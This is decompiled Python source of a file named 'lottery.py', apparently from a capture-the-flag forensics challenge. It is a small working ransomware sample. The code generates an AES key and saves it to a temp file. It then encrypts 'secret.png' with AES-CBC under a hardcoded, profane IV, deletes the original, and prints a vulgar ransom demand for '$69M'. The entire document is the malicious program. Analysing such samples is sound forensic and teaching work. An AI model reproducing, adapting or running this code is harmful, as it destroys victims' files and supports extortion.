# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.12.3 (v3.12.3:f6650f9ad7, Apr  9 2024, 08:18:47) [Clang 13.0.0 (clang-1300.0.29.30)]
# Embedded file name: lottery.py
import os, tempfile
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def generate_key():
    key = os.urandom(32)
    fp = tempfile.TemporaryFile(mode="w+b", delete=False)
    fp.write(key)
    return key


def encrypt_file(file_path, key):
    iv = b'urfuckedmogambro'
    with open(file_path, "rb") as file:
        data = file.read()
        padded_data = pad(data, AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_data = cipher.encrypt(padded_data)
    file.close()
    encrypted_file_path = file_path + ".enc"
    with open(encrypted_file_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)
    os.remove(file_path)


if __name__ == "__main__":
    key = generate_key()
    file_path = "secret.png"
    encrypt_file(file_path, key)
    print("Dear MogamBro, we are fucking your laptop with a ransomware & your secret image is now encrypted! Send $69M to recover it!")
